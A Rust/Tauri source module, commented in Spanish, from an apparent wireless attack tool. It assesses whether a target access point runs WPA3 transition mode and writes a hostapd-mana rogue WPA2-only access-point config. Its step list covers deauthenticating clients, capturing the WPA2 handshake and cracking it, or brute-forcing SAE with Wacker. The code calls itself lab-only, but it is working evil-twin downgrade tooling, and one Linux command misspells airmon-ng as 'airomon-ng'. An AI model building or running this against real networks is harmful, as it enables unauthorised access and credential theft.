// Módulo WPA3 — auditoría + generador de rogue conf para downgrade (lab).
//
// Honestidad de diseño (sin WSL ni inyección en este Windows, no se finge):
// - wpa3_audit: solo lectura (netsh). Distingue "WPA3 visto" de "transición
//   confirmada": netsh NO expone AKMs ni MFP, así que la transición solo queda
//   como "posible" hasta confirmar con tshark en Linux. Devuelve los comandos
//   exactos de confirmación.
// - gen_rogue_conf: genera el .conf de hostapd-mana (rogue solo-WPA2) para usar
//   en el lab Linux. No lanza nada aquí.
// - Wacker (online SAE) no se ejecuta desde Windows: la UI muestra la guía con
//   el comando ya relleno, para ejecutar en Kali con adaptador en managed mode.
use serde::Serialize;
use tauri::{command, AppHandle};
use crate::commands::CmdResponse;
use crate::profiler::{find_target, netsh_dump};

#[derive(Debug, Clone, Serialize)]
pub struct Wpa3Audit {
    pub ssid:      String,
    pub bssid:     String,
    pub auth_seen: String,
    /// not_wpa3 | sae_seen | transition_possible
    pub assessment: String,
    pub title:     String,
    pub detail:    String,
    pub mfp:       String,
    pub confirm_cmd_linux: String,
    pub next_steps: Vec<String>,
}

/// Clasificación pura (testeable) del auth visto por netsh.
pub fn assess(auth_raw: &str) -> (&'static str, &'static str, &'static str) {
    let a = auth_raw.to_lowercase().replace(['-', '_', ' '], "");
    let has_sae = a.contains("wpa3") || a.contains("sae");
    let has_psk = a.contains("wpa2") || a.contains("psk") || a.contains("wpapersonal");
    if has_sae && has_psk {
        ("transition_possible",
            "Posible transición WPA2+WPA3 — confirmar AKMs en Linux",
            "netsh muestra ambas familias, pero sin RSN IE no se puede confirmar. Si tshark confirma PSK+SAE y MFPR=0, el downgrade a WPA2 es viable (rogue solo-WPA2 + deauth + handshake clásico).")
    } else if has_sae {
        ("sae_seen",
            "WPA3 visto — SAE puro o transición oculta",
            "Windows suele reportar la transición como WPA2 o WPA3 según driver: no fiarse. Confirmar con tshark si hay pata PSK oculta; si es SAE puro, solo Wacker online (lento, vs claves débiles) o portal.")
    } else {
        ("not_wpa3",
            "Sin WPA3 a la vista",
            "El AP no anuncia WPA3 en este scan. El módulo WPA3 no aplica; usa el perfilador general (PMKID/handshake).")
    }
}

/// Comando: audita un BSSID en clave WPA3 (solo lectura).
#[command]
pub async fn wpa3_audit(app: AppHandle, bssid: String) -> Result<Wpa3Audit, String> {
    let raw = netsh_dump(&app).await?;
    let (ssid, auth, _cipher, _ch, _sig) = find_target(&raw, &bssid)
        .ok_or_else(|| format!("BSSID {} no visible en el último scan. Reescanea.", bssid))?;
    let (assessment, title, detail) = assess(&auth);
    Ok(Wpa3Audit {
        ssid: if ssid.is_empty() { "Red oculta".into() } else { ssid.clone() },
        bssid: bssid.to_uppercase(),
        auth_seen: if auth.is_empty() { "Desconocida".into() } else { auth },
        assessment: assessment.into(),
        title: title.into(),
        detail: detail.into(),
        mfp: "unknown (netsh no expone MFP)".into(),
        confirm_cmd_linux: format!(
            "sudo airomon-ng start wlan0 && sudo airodump-ng --bssid {} -c <canal> -w rsn wlan0mon # luego: tshark -r rsn-01.cap -Y 'wlan.rsnakms' -T fields -e wlan.rsnakms",
            bssid.to_uppercase()
        ),
        next_steps: vec![
            "1. En Kali: confirma AKMs (PSK 00-0F-AC:2 + SAE 00-0F-AC:8) y MFPC/MFPR con tshark.".into(),
            "2. Si transición + MFPR=0: genera el rogue .conf aquí abajo y lánzalo con hostapd-mana en Linux.".into(),
            "3. Deauth al cliente (aireplay-ng, Linux), captura el handshake WPA2 y crackéalo en la sección Estrategia.".into(),
            "4. Si SAE puro: solo Wacker online o portal cautivo. Expectativas bajas salvo clave débil.".into(),
        ],
    })
}

/// Genera el contenido del .conf de hostapd-mana (rogue solo-WPA2). Puro, testeable.
pub fn rogue_conf_text(ssid: &str, channel: u8, iface: &str, out_path: &str) -> String {
    format!(
        "# UIFIPILL — rogue WPA2-only para downgrade de transición (lab Linux)\n\
         # Uso: sudo hostapd-mana {out}\n\
         interface={iface}\n\
         driver=nl80211\n\
         hw_mode=g\n\
         channel={ch}\n\
         ssid={ssid}\n\
         mana_wpaout={out_base}.hccapx\n\
         wpa=2\n\
         wpa_key_mgmt=WPA-PSK\n\
         wpa_pairwise=TKIP CCMP\n\
         wpa_passphrase=12345678\n",
        out = out_path,
        iface = iface,
        ch = channel,
        ssid = ssid,
        out_base = out_path.trim_end_matches(".conf"),
    )
}

/// Comando: escribe el .conf del rogue AP y devuelve su contenido.
#[command]
pub async fn gen_rogue_conf(
    _app: AppHandle,
    ssid: String,
    channel: u8,
    iface: Option<String>,
    output_path: Option<String>,
) -> Result<CmdResponse, String> {
    if ssid.trim().is_empty() {
        return Err("SSID vacío".into());
    }
    if channel == 0 || channel > 165 {
        return Err("Canal 1-165".into());
    }
    let iface = iface.unwrap_or_else(|| "wlan1".into());
    let safe: String = ssid
        .chars()
        .map(|c| if c.is_alphanumeric() || c == '-' || c == '_' { c } else { '_' })
        .collect();
    let out = output_path.unwrap_or_else(|| format!("rogue_{}.conf", safe));
    let text = rogue_conf_text(ssid.trim(), channel, &iface, &out);
    std::fs::write(&out, &text).map_err(|e| format!("No se pudo escribir {}: {}", out, e))?;
    Ok(CmdResponse {
        success: true,
        output: format!("Rogue .conf escrito → {}\n\n{}\nLanza en Kali: sudo hostapd-mana {}", out, text, out),
        stderr: String::new(),
        exit_code: Some(0),
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn assessment_matrix() {
        assert_eq!(assess("WPA3-Personal").0, "sae_seen");
        assert_eq!(assess("WPA2-Personal WPA3-Personal").0, "transition_possible");
        assert_eq!(assess("WPA2-Personal").0, "not_wpa3");
        assert_eq!(assess("Abierta").0, "not_wpa3");
    }

    #[test]
    fn rogue_conf_shape() {
        let t = rogue_conf_text("Lab-WiFi", 6, "wlan1", "rogue_Lab-WiFi.conf");
        assert!(t.contains("ssid=Lab-WiFi"));
        assert!(t.contains("channel=6"));
        assert!(t.contains("wpa=2"));
        assert!(t.contains("wpa_key_mgmt=WPA-PSK"));
        assert!(t.contains("mana_wpaout=rogue_Lab-WiFi.hccapx"));
        assert!(!t.contains("sae"));
    }
}
